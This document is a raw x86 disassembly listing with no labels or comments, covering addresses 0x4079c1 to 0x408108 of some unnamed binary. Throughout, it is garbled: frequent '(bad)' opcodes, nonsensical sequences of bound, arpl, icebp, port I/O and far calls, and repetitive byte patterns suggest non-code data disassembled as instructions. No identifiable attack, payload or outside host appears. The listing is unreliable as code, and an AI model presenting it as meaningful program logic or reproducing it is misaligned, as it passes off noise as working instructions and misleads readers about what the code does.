  4079c1:	bound  edx,QWORD PTR [ebx+0x3562003d]
  4079c7:	add    al,BYTE PTR [eax]
  4079c9:	bound  edx,QWORD PTR [ecx+0x3]
  4079cc:	add    al,0x63
  4079ce:	dec    esi
  4079cf:	add    ebx,eax
  4079d1:	pusha  
  4079d2:	dec    edi
  4079d3:	add    eax,DWORD PTR [ecx+0x63]
  4079d6:	pop    ebp
  4079d7:	add    edi,DWORD PTR ds:0x5a031263
  4079dd:	arpl   WORD PTR [ecx],cx
  4079df:	add    esp,DWORD PTR [eax+0x63]
  4079e2:	push   ss
  4079e3:	add    ebx,DWORD PTR [esi+0x63]
  4079e6:	pop    ss
  4079e7:	add    esp,DWORD PTR [ebx+eiz*2+0xc]
  4079eb:	add    edi,DWORD PTR [ecx+0x63]
  4079ee:	adc    al,BYTE PTR [ebx]
  4079f0:	jge    0x407a55
  4079f2:	sbb    eax,DWORD PTR [ebx]
  4079f4:	jnp    0x407a59
  4079f6:	mov    eax,ds:0xd9630502
  4079fb:	cdq    
  4079fc:	add    eax,0x59ad729
  407a01:	mov    al,ds:0x34059cd8
  407a06:	fcom   DWORD PTR [ebp+0x7ed88905]
  407a0c:	add    eax,0x580d71d
  407a11:	inc    ebx
  407a12:	fdiv   DWORD PTR [ecx+0x5]
  407a15:	xor    eax,0x470572d8
  407a1a:	fsub   DWORD PTR [ebx+0x5]
  407a1d:	dec    eax
  407a1e:	fcomp  DWORD PTR [ebp+eax*1+0x0]
  407a22:	lahf   
  407a23:	(bad)  
  407a24:	push   ebp
  407a25:	add    eax,0x54ed834
  407a2a:	fsub   DWORD PTR cs:[edi-0x5527f1fb]
  407a31:	add    eax,0x5acd860
  407a36:	pop    ebx
  407a37:	fsub   DWORD PTR [ebp+0x2fd86405]
  407a3d:	add    eax,0x531d856
  407a42:	pop    edx
  407a43:	fsub   DWORD PTR [ebx]
  407a45:	add    eax,0x51ed858
  407a4a:	pop    esp
  407a4b:	fcom   DWORD PTR [edi]
  407a4d:	add    eax,0x518d852
  407a52:	mov    eax,ds:0x9d0519da
  407a57:	ficom  DWORD PTR [eax*1+0x53fdab2]
  407a5e:	stos   BYTE PTR es:[edi],al
  407a5f:	fiadd  DWORD PTR [eax+0x5]
  407a62:	int3   
  407a63:	fidiv  DWORD PTR [edx]
  407a65:	add    eax,0x52ddab2
  407a6a:	rcr    dl,0x7
  407a6d:	add    eax,0x50ada8f
  407a72:	popa   
  407a73:	fiadd  DWORD PTR [eax]
  407a75:	or     al,0x5f
  407a77:	mov    ds:0xd86706ff,eax
  407a7c:	call   eax
  407a7e:	pop    esi
  407a7f:	into   
  407a80:	call   edx
  407a82:	retw   0xc4ff
  407a86:	add    BYTE PTR [esi-0x3c],bl
  407a89:	(bad)  
  407a8a:	mov    ebp,0xb8ffd066
  407a8f:	pop    esi
  407a90:	retf   0xb7ff
  407a93:	adc    ax,0xbb00
  407a97:	pop    esi
  407a98:	adc    DWORD PTR [eax],eax
  407a9a:	mov    ah,0x66
  407a9c:	or     al,BYTE PTR [eax]
  407a9e:	mov    eax,ds:0xa000025e
  407aa3:	lock call WORD PTR [ecx-0x710015a2]
  407aab:	data16 cld 
  407aad:	inc    DWORD PTR [ebp+0x4803825e]
  407ab3:	addr16 mov bh,0xff
  407ab6:	dec    esi
  407ab7:	pop    edi
  407ab8:	mov    ch,0xff
  407aba:	aas    
  407abb:	addr16 test eax,0xbf5f91ff
  407ac1:	dec    DWORD PTR [edi+eiz*2+0x5f97ffa5]
  407ac8:	mov    eax,0xb66796ff
  407acd:	(bad)  
  407ace:	jg     0x407b2f
  407ad0:	stos   BYTE PTR es:[edi],al
  407ad1:	inc    DWORD PTR [ecx+0x74ffc067]
  407ad7:	pop    edi
  407ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ad9:	jmp    DWORD PTR [ebx]
  407adb:	addr16 sar edi,cl
  407ade:	cs pop edi
  407ae0:	sar    edi,1
  407ae2:	xor    esp,DWORD PTR [edi-0x47]
  407ae5:	push   DWORD PTR [eax]
  407ae7:	pop    edi
  407ae8:	mov    ebp,0x67002bff
  407aed:	in     eax,dx
  407aee:	(bad)  
  407aef:	(bad)  
  407af0:	jge    0x407ac8
  407af2:	pop    esp
  407af3:	add    DWORD PTR [esi-0x2a],esp
  407af6:	or     DWORD PTR [ecx],eax
  407af8:	gs (bad) 
  407afa:	pop    es
  407afb:	add    DWORD PTR [esi],edx
  407afd:	aad    0x1f
  407aff:	add    DWORD PTR [ebx],eax
  407b01:	xlat   BYTE PTR ds:[ebx]
  407b02:	sbb    eax,DWORD PTR [ecx]
  407b04:	push   ds
  407b05:	xlat   BYTE PTR ds:[ebx]
  407b06:	imul   eax,DWORD PTR [ecx],0xd
  407b09:	xlat   BYTE PTR ds:[ebx]
  407b0a:	pop    ebx
  407b0b:	add    ecx,ebx
  407b0d:	aad    0x38
  407b0f:	add    eax,ebx
  407b11:	aad    0x56
  407b13:	add    esi,esp
  407b15:	aad    0x28
  407b17:	add    ebp,esp
  407b19:	aad    0x39
  407b1b:	add    ecx,esp
  407b1d:	aad    0x12
  407b1f:	add    DWORD PTR [eax],esi
  407b21:	(bad)  
  407b22:	and    al,BYTE PTR [ecx]
  407b24:	das    
  407b25:	(bad)  
  407b26:	add    WORD PTR [eax],bx
  407b29:	(bad)  
  407b2a:	push   ebp
  407b2b:	add    DWORD PTR [esi],edx
  407b2d:	(bad)  
  407b2e:	daa    
  407b2f:	add    DWORD PTR [ebp-0x2a],esp
  407b32:	cmp    al,0x1
  407b34:	and    esi,edx
  407b36:	adc    DWORD PTR [ecx],eax
  407b38:	push   eax
  407b39:	(bad)  
  407b3a:	and    DWORD PTR [ecx],eax
  407b3c:	aas    
  407b3d:	(bad)  
  407b3e:	add    DWORD PTR gs:[esi-0x23feb52b],edi
  407b45:	aad    0x49
  407b47:	add    DWORD PTR [ebx-0x2a],ecx
  407b4a:	add    BYTE PTR [ecx],al
  407b4c:	inc    esp
  407b4d:	(bad)  
  407b4e:	add    DWORD PTR cs:[eax],eax
  407b51:	das    
  407b52:	(bad)  
  407b53:	push   ss
  407b54:	add    DWORD PTR [esp+edx*8-0x2b85fed6],ecx
  407b5b:	inc    ebx
  407b5c:	add    DWORD PTR [ecx-0x2c],ebp
  407b5f:	dec    esp
  407b60:	add    DWORD PTR [eax-0x5dfec92c],ecx
  407b66:	aam    0x72
  407b68:	add    DWORD PTR [edx-0x5b],esp
  407b6b:	add    ebp,DWORD PTR [eax+0x63]
  407b6e:	scas   al,BYTE PTR es:[edi]
  407b6f:	add    ebp,DWORD PTR [edx+0x63]
  407b72:	rol    BYTE PTR [ebx],1
  407b74:	add    DWORD PTR [ebx-0x29],esp
  407b77:	add    ebp,DWORD PTR [edi]
  407b79:	arpl   sp,dx
  407b7b:	add    edx,DWORD PTR [edi]
  407b7d:	arpl   WORD PTR [edi+0x5],bx
  407b80:	sub    esp,DWORD PTR [ebx-0x7f]
  407b83:	add    eax,0x5826346
  407b88:	dec    ebp
  407b89:	arpl   WORD PTR [ebx-0x769cc8fb],ax
  407b8f:	add    eax,0x5956373
  407b94:	imul   esp,DWORD PTR [ebx+0x1e],0xa6636b05
  407b9b:	add    BYTE PTR [esi],bh
  407b9d:	adc    BYTE PTR [ecx-0x2],0x1
  407ba1:	xchg   edx,eax
  407ba2:	adc    bh,dh
  407ba4:	or     esi,DWORD PTR [edx+0x13]
  407ba7:	dec    BYTE PTR [edx+esi*2]
  407baa:	or     al,0xfe
  407bac:	add    BYTE PTR [edx+0x15],dh
  407baf:	(bad)  
  407bb0:	cli    
  407bb1:	jb     0x407bc1
  407bb3:	(bad)  
  407bb4:	icebp  
  407bb5:	add    BYTE PTR [edx+0x17],dl
  407bb8:	(bad)  
  407bb9:	mov    al,ds:0xa2fe1852
  407bbe:	push   edx
  407bbf:	sbb    esi,edi
  407bc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bc2:	push   edx
  407bc3:	dec    edx
  407bc4:	(bad)  
  407bc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bc6:	xor    cl,BYTE PTR [ebx-0x2]
  407bc9:	test   al,0x32
  407bcb:	push   esp
  407bcc:	(bad)  
  407bcd:	loop   0x407c01
  407bcf:	(bad)  
  407bd1:	in     al,0x32
  407bd3:	inc    esi
  407bd4:	(bad)  
  407bd5:	out    0x92,al
  407bd7:	dec    edi
  407bd8:	inc    dl
  407bda:	xchg   edx,eax
  407bdb:	loopne 0x407bda
  407bdd:	sti    
  407bde:	xchg   edx,eax
  407bdf:	loope  0x407bde
  407be1:	mov    eax,ds:0xff59d992
  407be6:	add    DWORD PTR [ecx-0x570000a6],ebp
  407bec:	pop    ebx
  407bed:	inc    DWORD PTR ds:0xfbff54a9
  407bf3:	test   al,0x3d
  407bf5:	dec    eax
  407bf7:	test   al,0x36
  407bf9:	inc    esi
  407bfb:	test   al,0x2f
  407bfd:	(bad)  
  407bfe:	mov    esp,0xd2ff30a8
  407c03:	test   al,0xa1
  407c05:	add    BYTE PTR [ecx-0x50ff5d58],dh
  407c0b:	test   al,0x93
  407c0d:	add    BYTE PTR [ebp-0x54ff7358],dh
  407c13:	test   al,0x85
  407c15:	add    BYTE PTR [ecx],bl
  407c17:	test   eax,0x1700007e
  407c1c:	test   eax,0xa90d00a7
  407c21:	test   al,0x0
  407c23:	mov    ds:0xa600a9a8,eax
  407c28:	test   al,0xaa
  407c2a:	add    BYTE PTR [eax+ebp*4-0x5765ff55],bl
  407c31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c32:	add    BYTE PTR [eax-0x56ff5258],bl
  407c38:	test   al,0xa6
  407c3a:	add    BYTE PTR [esi-0x60ff6058],ah
  407c40:	test   al,0xa0
  407c42:	add    BYTE PTR [eax+ebp*4-0x5752ffcf],dl
  407c49:	xor    al,BYTE PTR [eax]
  407c4b:	nop
  407c4c:	test   al,0x23
  407c4e:	add    BYTE PTR [edi-0x75ffe358],dl
  407c54:	test   al,0x35
  407c56:	add    BYTE PTR [ecx],bh
  407c58:	stos   BYTE PTR es:[edi],al
  407c59:	add    BYTE PTR cs:[edx+ebp*4],dh
  407c5d:	add    BYTE PTR [ecx],bl
  407c5f:	bound  edi,QWORD PTR [ecx+esi*1+0x18]
  407c63:	bound  edi,QWORD PTR [ecx+0x31]
  407c66:	cmp    esp,DWORD PTR [edx+0x7a]
  407c69:	xor    DWORD PTR [edx],edi
  407c6b:	bound  esi,QWORD PTR [edi+0x31]
  407c6e:	cmp    eax,0x34317562
  407c73:	bound  esi,QWORD PTR [ebx+0x31]
  407c76:	pop    ds
  407c77:	bound  esi,QWORD PTR [ecx+0x31]
  407c7a:	push   ss
  407c7b:	bound  esi,QWORD PTR [edx+0x31]
  407c7e:	adc    DWORD PTR [eax],eax
  407c80:	bound  ebp,QWORD PTR [edi+0x31]
  407c83:	adc    BYTE PTR [edx+0x70],ah
  407c86:	xor    ebx,eax
  407c88:	std    
  407c89:	jo     0x407cbc
  407c8b:	ret    0x6df5
  407c8e:	xor    DWORD PTR [ebp-0x53ce9413],esi
  407c94:	in     eax,0x67
  407c96:	xor    DWORD PTR [edi-0x61cec023],esp
  407c9c:	aad    0x40
  407c9e:	xor    DWORD PTR [ebp+0x7206cd62],eax
  407ca4:	(bad)  
  407ca5:	rol    BYTE PTR [esi],0x66
  407ca8:	bound  edi,QWORD PTR [esi+eax*1+0x6ba62a8]
  407caf:	stos   DWORD PTR es:[edi],eax
  407cb0:	bound  esi,QWORD PTR [edi-0x479d55fa]
  407cb6:	push   es
  407cb7:	lods   eax,DWORD PTR ds:[esi]
  407cb8:	bound  esi,QWORD PTR [ebp-0x499d5bfa]
  407cbe:	push   es
  407cbf:	scas   eax,DWORD PTR es:[edi]
  407cc0:	bound  esi,QWORD PTR [ebx-0x4b9d59fa]
  407cc6:	push   es
  407cc7:	xor    DWORD PTR [edx-0x4f],esp
  407cca:	push   es
  407ccb:	xor    BYTE PTR [edx-0x4e],ah
  407cce:	push   es
  407ccf:	and    esp,DWORD PTR [edx-0x51]
  407cd2:	push   es
  407cd3:	and    ah,BYTE PTR [edx-0x50]
  407cd6:	push   es
  407cd7:	add    BYTE PTR [edi-0x79f9d327],dl
  407cdd:	fldcw  WORD PTR [ebx]
  407cdf:	push   es
  407ce0:	test   ecx,ebx
  407ce2:	cs push es
  407ce4:	add    BYTE PTR [ecx+ebx*8+0x2d],ah
  407ce8:	push   es
  407ce9:	jnp    0x407cc4
  407ceb:	xor    BYTE PTR [esi],al
  407ced:	jp     0x407cc8
  407cef:	das    
  407cf0:	push   es
  407cf1:	imul   ebx,ecx,0xd9680632
  407cf7:	xor    DWORD PTR [esi],eax
  407cf9:	jg     0x407cd4
  407cfb:	xor    al,0x6
  407cfd:	outs   dx,BYTE PTR ds:[esi]
  407cfe:	fnstenv [ebx]
  407d00:	push   es
  407d01:	ins    DWORD PTR es:[edi],dx
  407d02:	fnstenv [esi]
  407d04:	push   es
  407d05:	ins    BYTE PTR es:[edi],dx
  407d06:	fnstenv ds:0x365c2306
  407d0c:	push   es
  407d0d:	and    bl,BYTE PTR [ecx+edi*1+0x6]
  407d11:	mov    cl,0x5b
  407d13:	cmp    BYTE PTR [esi],al
  407d15:	sbb    ebx,DWORD PTR [esi+edi*1+0x6]
  407d19:	stos   BYTE PTR es:[edi],al
  407d1a:	pop    ebx
  407d1b:	inc    ecx
  407d1c:	push   es
  407d1d:	test   eax,0x9806405b
  407d22:	pop    ebx
  407d23:	inc    ebx
  407d24:	push   es
  407d25:	lahf   
  407d26:	pop    ebx
  407d27:	inc    edx
  407d28:	push   es
  407d29:	out    dx,al
  407d2a:	pop    ebx
  407d2b:	inc    ebp
  407d2c:	push   es
  407d2d:	fstp   QWORD PTR [ebx+0x44]
  407d30:	push   es
  407d31:	fcomp  QWORD PTR [ebx+0x47]
  407d34:	push   es
  407d35:	jecxz  0x407d92
  407d37:	inc    esi
  407d38:	push   es
  407d39:	repnz pop ebx
  407d3b:	dec    ecx
  407d3c:	push   es
  407d3d:	icebp  
  407d3e:	pop    ebx
  407d3f:	dec    eax
  407d40:	push   es
  407d41:	loopne 0x407d9e
  407d43:	dec    ebx
  407d44:	push   es
  407d45:	pop    es
  407d46:	pop    esp
  407d47:	dec    edx
  407d48:	push   es
  407d49:	add    BYTE PTR [esi],dl
  407d4b:	pop    esp
  407d4c:	dec    ebp
  407d4d:	push   es
  407d4e:	and    eax,0x62064c5c
  407d53:	adc    edi,esi
  407d55:	dec    esi
  407d56:	pop    esp
  407d57:	add    bh,dh
  407d59:	dec    edi
  407d5a:	mov    eax,fs:0x9e5c50fd
  407d60:	std    
  407d61:	push   ecx
  407d62:	fs push ecx
  407d64:	call   DWORD PTR [ecx+0x5e]
  407d67:	dec    esi
  407d68:	call   DWORD PTR [edx+0x66]
  407d6b:	ud0    edx,DWORD PTR [eax+0x5e]
  407d6f:	adc    al,0xff
  407d71:	push   ebx
  407d72:	or     ax,0x54ff
  407d76:	pop    esi
  407d77:	adc    bh,bh
  407d79:	push   ebp
  407d7a:	or     di,di
  407d7d:	push   esi
  407d7e:	pop    esi
  407d7f:	or     bh,bh
  407d81:	push   edi
  407d82:	sbb    di,di
  407d85:	pop    eax
  407d86:	pop    esi
  407d87:	push   ss
  407d88:	call   FWORD PTR [ecx+0x66]
  407d8b:	inc    edi
  407d8c:	cld    
  407d8d:	pop    edx
  407d8e:	pop    esi
  407d8f:	dec    esp
  407d90:	cld    
  407d91:	pop    ebx
  407d92:	push   bp
  407d94:	cld    
  407d95:	nop
  407d96:	pop    esi
  407d97:	(bad)  
  407d99:	pop    ebp
  407d9a:	inc    bx
  407d9c:	cld    
  407d9d:	pop    esi
  407d9e:	pop    esi
  407d9f:	loopne 0x407d9c
  407da1:	adc    eax,0x1fbe183
  407da6:	pop    esi
  407da7:	fdivp  st(3),st
  407da9:	add    ah,BYTE PTR [esi-0x1]
  407dac:	sti    
  407dad:	add    BYTE PTR [eax],al
  407daf:	pop    esi
  407db0:	add    al,0xfc
  407db2:	add    esp,DWORD PTR [esi-0x3]
  407db5:	sti    
  407db6:	add    al,0x5e
  407db8:	add    bh,ah
  407dba:	add    eax,0x6fb9b66
  407dbf:	pop    esi
  407dc0:	sbb    ah,bh
  407dc2:	pop    es
  407dc3:	test   ax,0x8fb
  407dc7:	pop    esi
  407dc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dc9:	sti    
  407dca:	or     DWORD PTR [esi-0x27],esp
  407dcd:	mov    ds:0x9bd568fd,al
  407dd2:	std    
  407dd3:	pop    ecx
  407dd4:	aad    0x94
  407dd6:	std    
  407dd7:	aad    0xd5
  407dd9:	(bad)  
  407dda:	std    
  407ddb:	outs   dx,DWORD PTR ds:[esi]
  407ddc:	aad    0x86
  407dde:	std    
  407ddf:	fs aad 0x27
  407de2:	std    
  407de3:	lahf   
  407de4:	aad    0x28
  407de6:	std    
  407de7:	jne    0x407dbe
  407de9:	sub    ebp,edi
  407deb:	jb     0x407dc2
  407ded:	sub    bh,ch
  407def:	lahf   
  407df0:	aad    0x23
  407df2:	std    
  407df3:	jno    0x407dca
  407df5:	sub    al,0xfd
  407df7:	outs   dx,BYTE PTR ds:[esi]
  407df8:	aad    0x25
  407dfa:	std    
  407dfb:	mov    eax,ds:0x50fd2ed5
  407e00:	aad    0x2f
  407e02:	std    
  407e03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e04:	aad    0x20
  407e06:	std    
  407e07:	dec    ebp
  407e08:	aad    0x21
  407e0a:	std    
  407e0b:	cmp    dl,ch
  407e0d:	mov    dl,0xa
  407e0f:	cmp    ch,dl
  407e11:	stos   DWORD PTR es:[edi],eax
  407e12:	or     al,BYTE PTR [eax]
  407e14:	sub    ebp,edx
  407e16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e17:	or     ah,BYTE PTR [esi]
  407e19:	aad    0x9d
  407e1b:	or     bl,BYTE PTR [edi-0x6bf5492b]
  407e21:	aad    0x97
  407e23:	or     cl,BYTE PTR [ebp+0x150a98d5]
  407e29:	aad    0x99
  407e2b:	or     ah,BYTE PTR [edx]
  407e2d:	aad    0xba
  407e2f:	or     ah,BYTE PTR [ebx]
  407e31:	aad    0xb3
  407e33:	or     ah,BYTE PTR [eax]
  407e35:	aad    0xbc
  407e37:	or     ah,BYTE PTR [ecx]
  407e39:	aad    0xb5
  407e3b:	or     dl,BYTE PTR [ebp+edx*8-0x62]
  407e3f:	or     dl,BYTE PTR [eax-0x2b]
  407e42:	lahf   
  407e43:	or     bl,BYTE PTR [esi]
  407e45:	aad    0x0
  407e47:	nop
  407e48:	pop    eax
  407e49:	push   cs
  407e4a:	add    eax,0x4a26893
  407e4f:	inc    edx
  407e50:	push   0x583d0511
  407e55:	or     al,0x5
  407e57:	xor    al,0x58
  407e59:	adc    BYTE PTR ds:0x4a0682f,al
  407e5f:	es push 0x584904a3
  407e65:	pop    es
  407e66:	add    eax,0x4e95848
  407e6b:	dec    ebx
  407e6c:	push   0x680a04ea
  407e71:	inc    DWORD PTR [eax*1+0xc04ed58]
  407e78:	add    BYTE PTR [eax-0x12],bl
  407e7b:	add    al,0x7
  407e7d:	push   0x680e04fd
  407e82:	in     al,dx
  407e83:	add    al,0x11
  407e85:	pop    eax
  407e86:	inc    BYTE PTR [eax+eax*1]
  407e89:	pop    eax
  407e8a:	icebp  
  407e8b:	add    al,0x3
  407e8d:	push   0x6bd204f2
  407e92:	repz add al,0xcd
  407e95:	pop    ebx
  407e96:	hlt    
  407e97:	add    al,0xc4
  407e99:	pop    ebx
  407e9a:	cmc    
  407e9b:	add    al,0xbf
  407e9d:	imul   esi,esi,0x4
  407ea0:	(bad)  
  407ea1:	imul   esi,edi,0x4
  407ea4:	mov    ecx,0xb804f85b
  407ea9:	pop    ebx
  407eaa:	or     BYTE PTR ds:0x4f96bbb,al
  407eb0:	call   0xfb5b:0x9504fa6b
  407eb7:	add    al,0x9c
  407eb9:	pop    ebx
  407eba:	cld    
  407ebb:	add    al,0x97
  407ebd:	imul   ebp,edi,0x4
  407ec0:	add    BYTE PTR [edx+eiz*8],dl
  407ec3:	adc    al,BYTE PTR [ebx+eiz*8]
  407ec6:	loop   0x407ef4
  407ec8:	add    al,0x12
  407eca:	loop   0x407ef5
  407ecc:	add    al,0xf1
  407ece:	loope  0x407ee5
  407ed0:	add    al,0x0
  407ed2:	loop   0x407efc
  407ed4:	add    al,0xf
  407ed6:	loop   0x407f03
  407ed8:	add    al,0xe
  407eda:	loop   0x407f03
  407edc:	add    al,0x0
  407ede:	lods   eax,DWORD PTR ds:[esi]
  407edf:	loop   0x407f06
  407ee1:	add    al,0x9c
  407ee3:	loop   0x407f0f
  407ee5:	add    al,0xda
  407ee7:	loop   0x407e6f
  407ee9:	add    ebx,ecx
  407eeb:	loop   0x407e75
  407eed:	add    ebp,eax
  407eef:	loop   0x407e78
  407ef1:	add    esp,DWORD PTR [edi-0x59fc751d]
  407ef7:	jecxz  0x407ea3
  407ef9:	add    edx,DWORD PTR [ebx+eiz*8-0x1c5cfc74]
  407f00:	mov    es,WORD PTR [ebx]
  407f02:	mov    dl,0xe3
  407f04:	test   eax,0x8de3b003
  407f09:	add    ebx,DWORD PTR [ebp+0x3c0383e3]
  407f0f:	jecxz  0x407f24
  407f11:	and    dl,bl
  407f13:	loope  0x407ec1
  407f15:	add    ecx,ecx
  407f17:	loope  0x407ec4
  407f19:	add    ecx,eax
  407f1b:	loope  0x407ecb
  407f1d:	add    esi,edi
  407f1f:	loope  0x407ece
  407f21:	add    edx,DWORD PTR [esi-0x1e]
  407f24:	retf   0x5503
  407f27:	loop   0x407eb9
  407f29:	add    eax,DWORD PTR [edx+eiz*8-0x34]
  407f2d:	add    esi,DWORD PTR [ebx]
  407f2f:	loop   0x407efc
  407f31:	add    eax,DWORD PTR [edx-0x1e]
  407f34:	leave  
  407f35:	add    eax,DWORD PTR [ecx-0x1e]
  407f38:	mov    al,0x3
  407f3a:	bound  ebp,QWORD PTR [ebx-0x7e9e31f9]
  407f40:	or     BYTE PTR [ecx+0x8846100],dl
  407f46:	xchg   edx,eax
  407f47:	popa   
  407f48:	or     DWORD PTR [eax],0xffffff93
  407f4b:	popa   
  407f4c:	xchg   BYTE PTR [eax],cl
  407f4e:	xchg   esp,eax
  407f4f:	popa   
  407f50:	jge    0x407f5a
  407f52:	xchg   ebp,eax
  407f53:	popa   
  407f54:	or     BYTE PTR [eax],cl
  407f56:	xchg   esi,eax
  407f57:	popa   
  407f58:	inc    DWORD PTR [edi]
  407f5a:	xchg   edi,eax
  407f5b:	popa   
  407f5c:	cli    
  407f5d:	pop    es
  407f5e:	cwde   
  407f5f:	popa   
  407f60:	stc    
  407f61:	pop    es
  407f62:	cdq    
  407f63:	popa   
  407f64:	or     cl,BYTE PTR [eax]
  407f66:	call   0xfc61:0x9b080b61
  407f6d:	pop    es
  407f6e:	pushf  
  407f6f:	popa   
  407f70:	cmc    
  407f71:	pop    es
  407f72:	popf   
  407f73:	popa   
  407f74:	push   cs
  407f75:	or     BYTE PTR [esi-0x60f7f89f],bl
  407f7b:	popa   
  407f7c:	adc    BYTE PTR [eax],cl
  407f7e:	mov    al,ds:0xa1081161
  407f83:	popa   
  407f84:	repnz pop es
  407f86:	mov    ds:0xa407ec61,eax
  407f8b:	popa   
  407f8c:	cmc    
  407f8d:	pop    es
  407f8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f8f:	popa   
  407f90:	out    dx,al
  407f91:	pop    es
  407f92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f93:	popa   
  407f94:	xchg   edi,eax
  407f95:	or     DWORD PTR [edi-0x57f6e79f],esp
  407f9b:	popa   
  407f9c:	mov    DWORD PTR [ecx],ecx
  407f9e:	test   eax,0xb1092161
  407fa3:	popa   
  407fa4:	and    cl,BYTE PTR [ecx]
  407fa6:	mov    dl,0x0
  407fa8:	popa   
  407fa9:	and    ecx,DWORD PTR [ecx]
  407fab:	mov    bl,0x61
  407fad:	and    al,0x9
  407faf:	mov    ah,0x61
  407fb1:	sbb    eax,0xd961b509
  407fb6:	lea    ecx,[eax]
  407fb8:	hlt    
  407fb9:	fiadd  DWORD PTR [esi+0x7fdaed08]
  407fbf:	or     dl,bl
  407fc1:	fiadd  DWORD PTR [eax-0x6e2524f8]
  407fc7:	or     al,cl
  407fc9:	ficom  DWORD PTR [edx-0x7c2536f8]
  407fcf:	or     BYTE PTR [esi-0x48f78326],bh
  407fd5:	ficom  DWORD PTR [ebp+0x8]
  407fd8:	lods   al,BYTE PTR ds:[esi]
  407fd9:	fimul  DWORD PTR [esi+0x8]
  407fdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fdd:	ficom  DWORD PTR [edi+0x8]
  407fe0:	and    bl,dl
  407fe2:	pop    eax
  407fe3:	or     BYTE PTR [ebx],ah
  407fe5:	fidivr DWORD PTR [ecx]
  407fe7:	or     BYTE PTR [ecx],ah
  407fe9:	fidivr DWORD PTR [edx]
  407feb:	or     BYTE PTR [eax],ah
  407fed:	fidivr DWORD PTR [ebx]
  407fef:	or     BYTE PTR [esi],ah
  407ff1:	fidiv  DWORD PTR [eax+ecx*1]
  407ff4:	pop    ds
  407ff5:	ficomp DWORD PTR ds:0x16da2408
  407ffb:	or     BYTE PTR ds:0x2a080fda,bl
  408001:	ficom  DWORD PTR [eax]
  408003:	or     BYTE PTR [ebx],ch
  408005:	fimul  DWORD PTR [eax-0x5]
  408008:	aam    0xf9
  40800a:	dec    ecx
  40800b:	sti    
  40800c:	add    BYTE PTR [ecx-0x4],bl
  40800f:	dec    edx
  408010:	sti    
  408011:	std    
  408012:	cld    
  408013:	inc    ebx
  408014:	sti    
  408015:	push   ebp
  408016:	cli    
  408017:	mov    esp,?
  408019:	inc    edx
  40801a:	cli    
  40801b:	test   esp,edi
  40801d:	arpl   sp,di
  40801f:	mov    ?,esp
  408021:	add    bh,dl
  408023:	jg     0x408021
  408025:	add    dl,bh
  408027:	nop
  408028:	cld    
  408029:	add    edx,edi
  40802b:	xchg   ecx,eax
  40802c:	cld    
  40802d:	(bad)  
  40802e:	stc    
  40802f:	add    BYTE PTR [edx+0x7d2272be],al
  408035:	mov    dh,0x74
  408037:	and    dl,BYTE PTR [esi+ebp*4+0x73]
  40803b:	and    cl,BYTE PTR [edi-0x5a]
  40803e:	jne    0x408062
  408040:	inc    esi
  408041:	sahf   
  408042:	jge    0x408066
  408044:	pop    ecx
  408045:	xchg   esi,eax
  408046:	and    DWORD PTR [edx],0x22b98e45
  40804c:	cmp    al,0x86
  40804e:	mov    ch,0x22
  408050:	aaa    
  408051:	jle    0x40800f
  408053:	and    ch,BYTE PTR [esi]
  408055:	jbe    0x408059
  408057:	and    ebp,DWORD PTR [ecx]
  408059:	outs   dx,BYTE PTR ds:[esi]
  40805a:	or     DWORD PTR [ebx],esp
  40805c:	sub    BYTE PTR [esi-0xc],ah
  40805f:	and    ch,BYTE PTR [ebx]
  408061:	pop    esi
  408062:	mul    DWORD PTR [edx]
  408064:	and    al,0x56
  408066:	fsub   QWORD PTR [edx]
  408068:	xor    DWORD PTR [esi+0x11],ecx
  40806b:	and    esi,DWORD PTR [eax]
  40806d:	inc    esi
  40806e:	cwde   
  40806f:	and    ah,BYTE PTR [eax+eax*1]
  408072:	sub    DWORD PTR ds:[eax],esp
  408075:	pop    ds
  408076:	sub    esp,DWORD PTR ss:[eax]
  408079:	ss cs mov edx,0xf3263722
  408080:	and    dh,BYTE PTR [ebx]
  408082:	push   ds
  408083:	pop    ebx
  408084:	and    esi,DWORD PTR [edx]
  408086:	push   ss
  408087:	pop    eax
  408088:	and    esp,DWORD PTR ds:0x1c23020e
  40808e:	push   es
  40808f:	add    esp,DWORD PTR [ebx]
  408091:	pop    ss
  408092:	(bad)  
  408093:	sti    
  408094:	and    cl,BYTE PTR [esi]
  408096:	idiv   ah
  408098:	and    dl,dh
  40809a:	jmp    0xea17a379
  40809f:	push   0x0
  4080a1:	rcr    cl,cl
  4080a3:	fs and ch,cl
  4080a6:	fldcw  WORD PTR [ecx+0x20]
  4080a9:	add    BYTE PTR [esi+0x5219050],ah
  4080af:	push   ecx
  4080b0:	xchg   ebx,eax
  4080b1:	and    esp,edx
  4080b3:	push   ebp
  4080b4:	and    BYTE PTR [ebx+ebp*4],ah
  4080b7:	push   ebp
  4080b8:	les    esp,FWORD PTR ds:0x259055da
  4080be:	fst    DWORD PTR [ebp+0x9]
  4080c1:	and    al,0xe8
  4080c3:	push   ebp
  4080c4:	or     ah,BYTE PTR [edi+ebx*8]
  4080c7:	push   ebp
  4080c8:	or     eax,0x855de24
  4080cd:	and    al,0xf3
  4080cf:	push   ebp
  4080d0:	and    ah,BYTE PTR [edx+eiz*8]
  4080d3:	push   ebp
  4080d4:	or     esp,DWORD PTR [eax+eax*1]
  4080d7:	loope  0x40812e
  4080d9:	push   ss
  4080da:	and    eax,0x250e5510
  4080df:	pop    ss
  4080e0:	push   ebp
  4080e1:	or     ah,BYTE PTR ds:0x251255a6
  4080e7:	xchg   ebp,eax
  4080e8:	push   ebp
  4080e9:	cmp    ah,BYTE PTR ds:0x23b855b4
  4080ef:	mov    edx,DWORD PTR [ebp-0x45]
  4080f2:	and    edi,DWORD PTR [edx+0x55]
  4080f5:	(bad)  
  4080f6:	and    al,0x79
  4080f8:	push   ebp
  4080f9:	mov    edx,0xbd554823
  4080fe:	and    ecx,DWORD PTR [edi+0x55]
  408101:	sbb    ah,BYTE PTR ds:0x2522557e
  408107:	ins    DWORD PTR es:[edi],dx
  408108:	push   ebp
